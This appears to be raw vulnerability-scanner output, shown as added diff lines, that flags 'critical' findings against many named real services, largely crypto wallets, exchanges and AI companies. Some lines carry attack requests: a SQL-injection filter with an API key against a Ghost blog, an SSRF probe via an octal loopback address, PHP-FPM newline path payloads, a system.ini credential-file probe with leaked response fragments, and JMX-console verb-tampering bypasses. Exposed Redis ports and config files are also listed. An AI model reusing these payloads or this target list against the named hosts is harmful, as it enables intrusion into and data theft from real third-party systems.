"https://web.onekey-asset.com/hardware/classic/firmware/v3.9.0/classic.3.9.0-Stable-0805-f3b0717.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.12.0-Stable-0225-5379167_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-btc-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.21.0/classic1s.3.21.0-Stable-be08c78_thd89_app_PROD_20260911_1.3.2_6699c5c_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.11.0/classic1s.3.11.0-Stable-0318-4b3cbd7_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.align.signed.enc.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.6.0/mini.3.6.0-Stable-1226-ff9efe5.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.9.1-Stable-0612-bacaa62.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se02-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/se/se_thd89-prod_release-se02-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.10.0/mini.3.10.0-Stable-0516-a9a94d6.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.2.0/mini.3.2.0-Stable-0802-6903c73.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://apps.microsoft.com/store/detail/XPFMHZDDF91TNL"",""url": "https://snapcraft.io/onekey-wallet"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se03-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/coprocessor/pro2_neo-prod_release-coprocessor-v1.0.22-36aeb9e-20260922-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/se/se_thd89-prod_release-se01-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.4.0/touch.4.4.0-Stable-0807-3e033eb.signed.bin"",""url": "https://appgallery.huawei.com/app/C107439249"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.16.0/classic1s.3.16.0-Stable-be46692.thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/flash/pro2_v3-prod_release-bootloader-v1.0.2-cd56f91c72f3-20260922_015009-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/flash/neo_v1-prod_release-bootloader-v1.0.2-cd56f91c72f3-20260922_015049-signed.okpkg"",""url": "https://web.onekey-asset.com/app-monorepo/v6.6.1/OneKey-Wallet-6.6.1-android.apk"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.10.0/classic.3.10.0-Stable-0512-7031656.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.4.0/classic.3.4.0-Stable-0917-d38a468.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.2.0/classic.3.2.0-Stable-0802-a013aec.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.9.0/mini.3.9.0-Stable-0807-a8b4519.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.12.0/Touch.4.12.0-Stable-1205-da09c43.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.7.0/touch.4.7.0-Stable-1227-2c4d945-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.3/components/pro2_v3-prod_release-core_p2-v1.0.3-261f11a74247-20260929_075041-unsigned.signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.12.1/classic1s.3.12.1-Stable-1cf7797_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10_merged.signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/4.0.0/touch.4.0.0-Stable-0118-e901cef-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se01-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se04-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.3/components/neo_v1-prod_release-core_p1-v1.0.3-261f11a74247-20260929_075043-unsigned.signed.okpkg""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://support.bitbox.swiss/settings.json [""url":"https://support.bitbox.swiss/manage-accounts"",""url":"https://support.bitbox.swiss/settings/how-to-factory-reset-bitbox02"",""url":"https://support.bitbox.swiss/settings"",""url":"https://support.bitbox.swiss/advanced-settings"",""url":"https://support.bitbox.swiss/general""] [path="/settings.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[CVE-2026-109618:version-eol-branch] [http] [critical] http://www.alphawallet.com ["7.3.33"]
+[CVE-2026-109618:version-vulnerable-no-crash] [http] [critical] http://www.foxwallet.com ["8.3.35"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://img.elevenlabs.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://img.elevenlabs.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2026-24207] [http] [critical] https://klingai.com/models
+[CVE-2026-24207] [http] [critical] https://www.klingai.com/models
+[pdf-signer-ssti-to-rce] [http] [critical] https://developer.topazlabs.com
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://e.dev-rbx-1.rumble.com/config/config.json [""url":"https://e.dev-rbx-1.rumble.com/config/config.json""] [path="/config/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://e.rumble.com/config.local.json [""url":"https://e.rumble.com/config.local.json""] [path="/config.local.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
+[CVE-2026-27960] [http] [critical] http://api.fission.xyz/graphql [""]
+[CVE-2026-27960] [http] [critical] https://api.stage.fission.xyz/graphql [""]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://riot.bitgo.com/config.json [""url": "https://element.io/privacy"",""url": "https://riot.bitgo.com/privacy_policy/en/cookie_policy.html"",""url": "https://riot.bitgo.com/privacy_policy/en/privacy_notice.html""] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://riot.bitgo.com/config.json ["https://scalar.vector.im/api"] [path="/config.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.kaiko.com
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.ethgas.com
+[CVE-2019-11043] [http] [critical] https://news.ryder.id/index.php/%0a
+[CVE-2019-11043] [http] [critical] https://news.ryder.id/index.php/%0atest
+[CVE-2019-11043] [http] [critical] https://www.news.ryder.id/index.php/%0a
+[CVE-2019-11043] [http] [critical] https://www.news.ryder.id/index.php/%0atest
+[CVE-2026-24207] [http] [critical] https://smolclyde-api.treasure.lol/models
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.internal-mainnet.pearlresearch.ai/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.internal.pearlresearch.ai/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.pearlresearch.ai/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.testnet.pearlresearch.ai/api/v2/config.json [path="/api/v2/config.json"]
+[CVE-2025-55182] [http] [critical] https://chat.sgp-infra-staging-azure.scale.com
+[CVE-2017-8225:password] [http] [critical] https://mobile-api.mayan.finance/system.ini?loginuse&loginpas ["sage":""},"walletConnectConfig"","bsc":0.001,"polygon":0.1,"avala","avalanche":15,"ethereum":70,"po","forceUpdateMessage":"A new vers"]
+[CVE-2017-8225:password] [http] [critical] https://monerolwsdb-eusa1.edge.app/system.ini?loginuse&loginpas ["iled replicator changes manager","ouchdb@127.0.0.1"} 0","s value is set by the GOGC envi","Int64. This value is set by the","taneously. Sourced from /sched/","spent in seconds."]
+[CVE-2017-8225:password] [http] [critical] https://monerolwsdb-wusa1.edge.app/system.ini?loginuse&loginpas ["s value is set by the GOGC envi","Int64. This value is set by the","taneously. Sourced from /sched/","spent in seconds.","iled replicator changes manager","ouchdb@monerolwsdb-wusa1-int.ed","ouchdb@monerolwsdb-wusa2-int.ed","ouchdb@monerolwsdb-wusa3-int.ed"]
+[CVE-2025-46817:version] [javascript] [critical] staging-v2.oolka.in:6379 ["6.0.16"]
+[CVE-2025-49844:version] [javascript] [critical] staging-v2.oolka.in:6379 ["6.0.16"]
+[CVE-2026-72898] [http] [critical] https://metabase.oolka.in/api/session/reset_password
+[CVE-2026-72898] [http] [critical] https://metabase.phot.ai/api/session/reset_password
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://goartwebapi.fotor.com/api/config.json [""url":"https://dl.haozhaopian.net/launchAds/73E152A8E5E282D48720C72D833459B7.png"",""url":"https://dl.haozhaopian.net/launchAds/08A7A7A5E67DDCBBAAC8F659046419E3.png"",""url":"https://dl.haozhaopian.net/launchAds/67987241FDBD03051EAF855663F8868A.png"",""url":"https://pub-static.fotor.com/goart-nft/banners/96bafc36e65e449395814979c2b64080.png"",""url":"https://pub-static.fotor.com/goart-nft/banners/116774658b984abd92d0ff041f53d737.png""] [path="/api/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://mobile-api.mayan.finance/application.json [""url":"https://discord.gg/h5HUzkqrXK"",""url":"https://twitter.com/mayanfinance"",""url":"https://blog.mayan.finance/"",""url":"https://docs.mayan.finance/""] [path="/application.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://ss.symbiosis.finance/config.json [""url": "https://ss.symbiosis.finance/server""] [path="/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://bch-eusa1.edge.app/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc-eu1.edge.app/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://dgb-eu2.edge.app/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://doge-eusa1.edge.app/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://pivx-eusa1.edge.app/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://vtc-wusa1.edge.app/api/v1/config.json [path="/api/v1/config.json"]
+[CVE-2022-26143:version] [http] [critical] https://tx-history.titan.exchange/ucs/micollab/version.json ["3.0.0"]
+[CVE-2026-33032] [http] [critical] https://base-alchemy-6jwbhj.stepn.com/mcp_message
+[CVE-2026-33032] [http] [critical] https://bsc-alchemy-aqbzpw.stepn.com/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-alchemy-hwvcei.stepn.com/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-alchemy-szuthp.stepn.com/mcp_message
+[CVE-2026-33032] [http] [critical] https://sol-alchemy-v6ualo.stepn.com/mcp_message
+[config-json-exposure-fuzz] [http] [critical] https://btc3.trezor.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://crew.cdn.staratlas.com/config.json [path="/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://tbtc1.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://tx-history.titan.exchange/config.dev.json [path="/config.dev.json"]
+[CVE-2025-29927] [http] [critical] https://beta-peak.birdeye.so
+[CVE-2025-29927] [http] [critical] https://peak.birdeye.so
+[CVE-2026-72898] [http] [critical] https://insights.audius.co/api/session/reset_password
+[config-json-exposure-fuzz] [http] [critical] https://passbolt.staging.talent.superteam.fun/settings.json [path="/settings.json"]
+[CVE-2025-29927] [http] [critical] https://fellowship.perplexity.ai
+[CVE-2025-29927] [http] [critical] https://platform.suno.com
+[CVE-2026-24207] [http] [critical] https://klingai.com/models
+[CVE-2026-24207] [http] [critical] https://www.klingai.com/models
+[CVE-2025-29927] [http] [critical] https://admin.blox.my
+[CVE-2025-29927] [http] [critical] https://admin.janjipay.development.blox.my
+[CVE-2025-29927] [http] [critical] https://goinno-demo-admin.development.blox.my
+[CVE-2025-46817:version] [javascript] [critical] grpc-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] storage-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] api-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] grpc-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] merchant-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] staging.botanika.ai:6379 ["7.4.10"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.kaiko.com
+[CVE-2026-72898] [http] [critical] https://dashboard.paraswap.io/api/session/reset_password
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.pancakeswap.finance
+[CVE-2025-29927] [http] [critical] https://api-dashboard.xverse.app
+[CVE-2025-29927] [http] [critical] https://cs.backpack.exchange
+[CVE-2025-29927] [http] [critical] https://developers.backpack.exchange
+[CVE-2025-29927] [http] [critical] https://employee.backpack.exchange
+[CVE-2026-33032] [http] [critical] https://evm-1.keplr.app/mcp_message
+[CVE-2026-72898] [http] [critical] https://metabase-analytics-public.zerion.io/api/session/reset_password
+[CVE-2026-72898] [http] [critical] https://metabase-analytics.zerion.io/api/session/reset_password
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://data.onekey.so/config.json [""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.6.0/mini.3.6.0-Stable-1226-ff9efe5.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.7.0/touch.4.7.0-Stable-1227-2c4d945-signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.4.0/touch.4.4.0-Stable-0807-3e033eb.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.2.0/classic.3.2.0-Stable-0802-a013aec.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.11.0/touch.4.11.0-Stable-0606-204425e.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-btc-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://apps.microsoft.com/store/detail/XPFMHZDDF91TNL"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/flash/pro2_v3-prod_release-bootloader-v1.0.2-cd56f91c72f3-20260922_015009-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se01-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://appgallery.huawei.com/app/C107439249"",""url": "https://1key.so/go/google-play"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.20.0/classic1s.3.20.0-Stable-btc-885e51d_thd89_app_PROD_20250826_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.9.0/mini.3.9.0-Stable-0807-a8b4519.signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/4.0.0/touch.4.0.0-Stable-0118-e901cef-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se04-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.10.0/classic.3.10.0-Stable-0512-7031656.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.20.0/classic1s.3.20.0-Stable-885e51d_thd89_app_PROD_20250826_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.2.0/mini.3.2.0-Stable-0802-6903c73.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.10.0/touch.4.10.0-Stable-0304-834ea82.signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/3.4.0/touch.3.4.0-Stable-1120-38abffd-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se02-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/flash/neo_v1-prod_release-bootloader-v1.0.2-cd56f91c72f3-20260922_015049-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/se/se_thd89-prod_release-se02-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.9.0/classic.3.9.0-Stable-0805-f3b0717.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.4.0/classic.3.4.0-Stable-0917-d38a468.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/classic.2.11.0-Stable-0323-c67044f.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.16.0/classic1s.3.16.0-Stable-be46692.thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.9.1-Stable-0612-bacaa62.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.12.0-Stable-0225-5379167_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/se/se_thd89-prod_release-se03-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/coprocessor/pro2_neo-prod_release-coprocessor-v1.0.22-36aeb9e-20260922-signed.okpkg"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/classic.3.0.0-Stable-0511-0bf60dd.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/mini.2.11.0-Stable-0323-19ff5d9-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.18.0-Stable-1217-659efd6_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.signed.bin"",""url": "https://snapcraft.io/onekey-wallet"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/flash/pro2_v3-prod_release-core_p1-v1.0.2-cd56f91c72f3-20260922_015009-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/coprocessor/pro2_neo-prod_release-coprocessor-v1.0.22-36aeb9e-20260922-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/flash/neo_v1-prod_release-core_p1-v1.0.2-cd56f91c72f3-20260922_015049-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/fatfs/neo_v1-prod_release-core_p2-v1.0.2-cd56f91c72f3-20260922_015049-signed.okpkg"",""url": "https://web.onekey-asset.com/app-monorepo/v6.6.0/OneKey-Wallet-6.6.0-android.apk"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.12.0/classic.3.12.0-Stable-0205-05bae9f.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.12.0/Touch.4.12.0-Stable-1205-da09c43.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.14.0-Stable-0704-f23570e_1.1.5_dfc6ccf_0x10_1.1.6_dfcd608_0x13.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.11.0/classic.3.11.0-Stable-0908-75f1721.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.12.1/classic1s.3.12.1-Stable-1cf7797_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10_merged.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/mini.3.0.0-Stable-0518-b860d10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/fatfs/pro2_v3-prod_release-core_p2-v1.0.2-cd56f91c72f3-20260922_015009-signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/neo/v1.0.2/se/se_thd89-prod_release-se01-v1.3.2-6699c5c-20260911-signed.okpkg"",""url": "https://apps.apple.com/us/app/onekey-open-source-wallet/id1609559473"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.11.0/classic1s.3.11.0-Stable-0318-4b3cbd7_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.align.signed.enc.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.10.0/mini.3.10.0-Stable-0516-a9a94d6.signed.bin""] [path="/config.json"]
+[CVE-2021-28918] [http] [critical] https://legacy-docs.across.to/?url=http://0177.0.0.1/server-status
+[CVE-2025-29927] [http] [critical] https://cryptoleads.wormhole.com
+[CVE-2026-26980] [http] [critical] https://blog.lido.fi/ghost/api/content/tags/?key=1533352e47c2231a354ec1fc86&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-09-02-13-00]
+[CVE-2026-33032] [http] [critical] https://rpc-alchemy.scroll.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.euler.finance/mcp_message
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://api.pol.polygon.technology/config.json [""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a998d755abe5d473050e17_CLI%206%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699f40a0f9a722034fa0ca1b_BBRL%20(3).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/696f89fabb9df6b3a1ceed65_RZ_Announcement_v_01%20(0-00-08-03).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69445d06e82705ca170a9aa8_non-USD%20stablecoin%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69380c8564deb621bdca89fa_Madhugiri_static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6903604aef39b3d82be0568e_Flutterwave_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691b520eb0d404ae85ca1cb3_Mastercard_Polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a85cd6fce8b63d6648d00c_Lisovo%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6fc8342715be79b193097_Paxos%20on%20Polygon_Blog%20Cover%201%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1fc8b98c13f922256601b_putting%20the%20stack%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6995e91bcb79c45fc0dac26f_SequenceBlog.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e79c99358a38cf7f9916c2_Amina%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699cbac0e45c0489bc294741_Coinme_Trust%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68de664c017b0e26ed0b4d74_Alloy%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68dd0aa6fda8da7470558a33_immutable%20play%20polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68cc2c7dc86d93a882d89cd1_CypherxPOL_1_2.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68c360404529c241473e4b5d_Rio_Testnet%20blog%20cover.jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69aab8614ac41c9231109fbb_LATAM%20stablecoins.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a04f1393460fd20f8ea736_JPYC.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6942b3f50b2ffe7ce3229ee6_BOYSCLUB%20X%20POLYGON.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68b88332d8385ea67b4c228b_MATICPOL_Complete%20(1).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6915fa915a5be905fd5f1fad_R25.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68af229e0133476c8d9e7a64_Polygon_x_USDT0.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6e6a6c2db55d73cf2abb1_FINAL%20Polygon%20x%20DeCard.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1d9a81e825fb2f84c4589_wallets.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6954143928fc41e2df1645eb_2%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691c5846dcf017ba7c793229_Revolut_Static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68f25ca38b5f6f2fd178cc59_payments%20101.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e66a1e9e9ebb1e98d50e50_Rio%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699de5f66450794cfac25a6d_Blog_Feb24%20(1)%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69723c17303550ee9d55483b_putting%20open%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69664feb9a8a61663ce88321_blog%20cover%20(2).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69148a21d70a7d1e370622d9_Calastone_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69020f49116940f0fb7db535_DCS_Static_Cover%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6900b8d1de6bc44e36ebd740_Manifold_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6980badd87658ae7ec957cae_coinme%20case%20study.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/694972be7338f7e4c6bf7271_Shift4%20announcement.png""] [path="/config.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
+[CVE-2026-72898] [http] [critical] https://data.maple.finance/api/session/reset_password
+[CVE-2025-29927] [http] [critical] https://app.primeintellect.ai
+[CVE-2025-29927] [http] [critical] https://app.testnet.umia.finance
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://pro.kraken.com/config.json [""url": "https://www.googletagmanager.com/gtag/js?id=G-8XGH4PGY4S""] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://pro.kraken.com/config.json ["https://iapi.kraken.com/api","https://api-prime-md.kraken.com/api","https://www.kraken.com/api"] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://support.kraken.com/config.json ["https://www.kraken.com/api"] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://www.kraken.com/config.json ["https://www.kraken.com/api"] [path="/config.json"]
+[CVE-2025-29927] [http] [critical] https://trends.xhunt.ai
+[CVE-2025-29927] [http] [critical] https://docs.taktile.com
+[CVE-2025-29927] [http] [critical] https://creators.higgsfield.ai
+[CVE-2025-29927] [http] [critical] https://fellowship.perplexity.ai
+[CVE-2025-46817:version] [javascript] [critical] admin-rn2-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] api-rn2-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] api-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] grpc-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-46817:version] [javascript] [critical] storage-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2025-49844:version] [javascript] [critical] storage-staging.botanika.ai:6379 ["7.4.10"]
+[CVE-2026-24207] [http] [critical] https://smolclyde-api.treasure.lol/models
+[CVE-2026-26980] [http] [critical] https://blog.lido.fi/ghost/api/content/tags/?key=1533352e47c2231a354ec1fc86&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-09-02-13-00]
